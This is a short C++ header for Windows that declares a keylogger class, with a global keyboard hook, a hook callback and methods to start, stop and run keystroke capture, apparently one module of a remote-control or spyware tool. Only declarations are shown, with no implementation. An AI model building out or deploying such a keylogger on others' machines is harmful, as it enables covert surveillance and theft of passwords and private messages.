#pragma once
#include "DataObj/DataObj.h"
#include <memory>
#include <conio.h>
#include <windows.h>
#include <vector>
#include <thread>



class KLG_Func
{

	
	static HHOOK hook;
	static bool keylogging;
public:
	
	
	friend LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);

	
	std::shared_ptr<DataObj> keylogger();
	static void KeylogThreadFunc(std::string& res);
	std::shared_ptr<DataObj> startKeylog();
	std::shared_ptr<DataObj> stopKeylog();

};